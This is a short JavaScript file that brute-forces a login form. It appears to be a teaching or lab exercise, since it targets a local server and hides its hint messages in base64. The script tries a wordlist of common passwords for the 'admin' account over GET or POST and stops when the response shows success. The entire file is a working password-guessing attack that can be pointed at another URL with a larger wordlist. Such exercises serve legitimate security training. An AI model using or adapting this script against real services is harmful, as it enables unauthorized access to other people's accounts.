// Developer Comment: Sending username + password to this URL for verification. Change as required. 
let URL_TO_TEST = "http://127.0.0.1:5000/verify_login"

// Developer Comment: Set HTTP request method for contacting server 
let METHOD_TO_USE = "GET"

// Developer Comment: Passwords to test using brute force. Add more common passwords as required.
wordlist = ["123456", "12345678", "qwerty"]

/////

let i = 0
let password_found = false

var xhttp = new XMLHttpRequest();

function makeRequest() {
    
    console.log("Trying password: " + wordlist[i])

    let a = METHOD_TO_USE
    if (a == atob("R0VU")) {
        xhttp.open(METHOD_TO_USE, URL_TO_TEST + "?" + "nm=admin&password=" + wordlist[i], true);
        xhttp.send()
    }
    else if (a == atob("UE9TVA==")) {
        xhttp.open(METHOD_TO_USE, URL_TO_TEST, true);
        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhttp.send("nm=admin&password=" + wordlist[i]);
    }  
}

makeRequest();

xhttp.onreadystatechange = function() {
  if (this.readyState == 4 && this.status == 200) {
    if (this.responseText.includes("39d9147c-d065-4aba-980e-6f86942c319f")) {
        console.log(wordlist[i] + " is incorrect")
    }
    else if (this.responseText.includes("e4b2a605-ad6c-45f5-9519-2905fe347b27")) {
        console.log("Password correct")
        console.log("Stopping script...")
        password_found = true
        return
    }
    else {
        console.log(atob("U2NyaXB0IGVycm9yOiBVUkwgYXBwZWFycyB0byBiZSBpbmNvcnJlY3QuIFdoYXQgaXMgdGhlIGNvcnJlY3QgVVJMIHlvdSBuZWVkIHRvIHVzZT8"))
        console.log("Stopping script...")
        return
    }
    console.log("---")
    i++;
    if (i < wordlist.length){
        makeRequest()
    } else if (password_found == false) {
        console.log(`Script message: Brute force search of ${wordlist.length} passwords completed with no password found. Do you need to use a different wordlist?`)
    }
  } 
  else if (this.readyState == 4 && this.status == 404) {
    console.log(atob("U2NyaXB0IGVycm9yOiBVUkwgTk9UIEZPVU5ELiBVUkwgdXNlZCBtYXkgYmUgaW5jb3JyZWN0LiBXaGF0IGlzIHRoZSBjb3JyZWN0IFVSTCB5b3UgbmVlZCB0byB1c2U/"))
  }
  else if (this.readyState == 4 && this.status == 405) {
    console.log(atob("U2NyaXB0IGVycm9yOiBNRVRIT0QgTk9UIEFMTE9XRUQuIEhUVFAgcmVxdWVzdCBtZXRob2QgdXNlZCBtYXkgYmUgaW5jb3JyZWN0LiBXaGF0IGlzIHRoZSBjb3JyZWN0IEhUVFAgcmVxdWVzdCBtZXRob2QgeW91IG5lZWQgdG8gdXNlPw=="))
  }
};
